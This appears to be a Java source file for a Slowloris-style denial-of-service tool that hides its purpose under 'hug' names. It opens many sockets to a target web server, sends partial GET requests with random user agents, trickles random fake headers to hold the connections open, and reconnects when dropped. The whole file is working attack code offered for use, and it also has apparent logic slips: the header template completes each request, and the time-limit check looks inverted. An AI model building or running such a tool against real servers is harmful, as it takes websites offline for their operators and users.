package com.hugs;

import java.io.*;
import java.net.*;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import static com.hugs.UserAgents.AGENTS;
import static com.hugs.Utils.RND;
import static com.hugs.Utils.sleep;
import static java.lang.Math.max;
import static java.lang.System.lineSeparator;

public class Hugger implements Runnable {

    private static final Logger log = LogManager.getLogger(Hugger.class);

    private static final int PAUSE_BETWEEN_REQUESTS = 1000;
    private static final int LONG_PAUSE = 10_000;

    private URL hugReceiver;
    private int port;
    private int hugTime;
    private int connections;
    private Socket[] sockets;
    private String[] partialRequests;

    private boolean keepHugsIfNoResponse = false;
    private boolean stop = false;

    public Hugger(URL hugReceiver, Conf conf) {
        this.hugReceiver = hugReceiver;
        port = conf.port();
        hugTime = conf.timeLimit();
        connections = conf.connections();
        sockets = new Socket[connections];
        partialRequests = new String[connections];
        keepHugsIfNoResponse = conf.hugUnresponsiveReceiver();
    }

    @Override
    public void run() {
        long startTime = System.currentTimeMillis();

        // each connection sends a partial request
        for (int i = 0; i < connections && !stop; i++) {
            init(i);
            sendPartialRequest(i);
            sleep(100, PAUSE_BETWEEN_REQUESTS);
        }

        int wave = 0;
        while (!endCondition(startTime)) {
            hug();
            sleep(100, PAUSE_BETWEEN_REQUESTS); // wait a random time before sending
            log.info("{} wave of hugs for {}", wave++, hugReceiver);
        }

        log.info("{} had enough hugs. Ending", hugReceiver);
        closeAllConnections();
    }

    public void stop() {
        log.info("Stopping because of an external signal");
        stop = true;
    }

    private boolean endCondition(long startTime) {
        boolean timeout = hugTime > 0 ? (System.currentTimeMillis() - startTime) < (hugTime * 60 * 1000) : false;
        return stop || timeout;
    }

    /**
     * creates the initial partial request and connection that are sent to the server
     */
    private void init(int index){
        createInitialPartialRequest(index);
        initConnection(index);
    }

    private void createInitialPartialRequest(int index) {
        String agent = AGENTS[RND.nextInt(AGENTS.length)];
        partialRequests[index] = String.format(headerTemplate(), agent);
        log.trace(partialRequests[index]);
    }

    private String headerTemplate(){
        String pagePrefix = hugReceiver.getPath().startsWith("/") ? "" : "/";
        String type = "GET " + pagePrefix + hugReceiver.getPath() + " HTTP/1.1" +  lineSeparator();
        String host = "Host: " + hugReceiver.getHost() + (port == 80 ? "" : ":" + port) + lineSeparator();
        String agent = "User-Agent: %s" + lineSeparator();
        String accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" + lineSeparator();
        String connection = "Connection: keep-alive" +  lineSeparator();
        String cache = "Cache-Control: no-cache" +  lineSeparator();
        return type + host + agent + accept + connection + cache + lineSeparator();
    }

    /**
     * used to start a connection with the server for a specified index. Sets up the socket
     *
     * @param index which connction index to set up
     */
    private void initConnection(int index) {
        try {
            if (!stop){
                log.info("Establishing connection to {}: {}", hugReceiver, index);
                InetAddress address = InetAddress.getByName(hugReceiver.getHost());
                sockets[index] = new Socket(address, port);
            }
        } catch(ConnectException e){
            stop = keepHugsIfNoResponse ? stop : true;
            log.info("{} doesn't respond to hugs anymore", hugReceiver);
        } catch (IOException e) {
            stop = true;
            log.error("Couldn't establish connection to {}. Stopping", hugReceiver);
            log.debug("Reason: ", e);
        }
    }

    /**
     * "gracefully" terminates all the connections by sending \n
     */
    private void closeAllConnections() {
        for (int i = 0; i < connections; i++) {
            try {
                if (sockets[i] != null) sockets[i].getOutputStream().write(lineSeparator().getBytes());
            } catch (IOException e) {
                log.warn("Couldn't gracefully close connections");
                log.debug("Reason:", e);
            } finally {
                try{
                    if (sockets[i] != null && !sockets[i].isClosed()) sockets[i].close();
                } catch(IOException e) {
                    log.debug("Can't close connection:", e);
                }
            }
        }
    }

    /**
     * sends useless information to the server for each connection. Keeps the connection alive
     */
    private void hug() {
        for (int i = 0; i < connections && !stop; i++) {
            sendFalseHeaderField(i);
            sleep(10, max(50, PAUSE_BETWEEN_REQUESTS / connections));
        }
    }

    /**
     * sends a fake header to the server so the server keeps the connection open
     *
     * @param index the index of the connection to send the fake info
     */
    private void sendFalseHeaderField(int index) {
        char[] alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
        String fakeField = alphabet[RND.nextInt(alphabet.length)] + "-" + alphabet[RND.nextInt(alphabet.length)] + ": " + RND.nextInt() + lineSeparator();
        log.trace("Fake field: {}", fakeField);
        try {
            if (sockets[index] != null && !stop) sockets[index].getOutputStream().write(fakeField.getBytes());
        } catch (IOException e) {
            log.error("Failed to send header to {}. Reconnecting...", hugReceiver);
            log.debug("Reason:", e);
            init(index); // try to reestablish connection
            sleep(LONG_PAUSE/2, LONG_PAUSE*2);
        }
    }

    /**
     * sends a partial HTTP GET request to the server
     *
     * @param index the Socket at index is used to send the request
     */
    private void sendPartialRequest(int index) {
        try {
            // write a random partial HTTP GET request to the server
            if (sockets[index] != null && !stop) {
                log.info("Sending partial request to: {} [{}]", hugReceiver, index);
                sockets[index].getOutputStream().write(partialRequests[index].getBytes());
            }
        } catch (IOException e) {
            log.error("Failed to send partial request to {}. Reconnecting...", hugReceiver);
            log.debug("Exception:", e);
            init(index); // try to reestablish connection
            sleep(LONG_PAUSE/2, LONG_PAUSE*2);
        }
    }

}
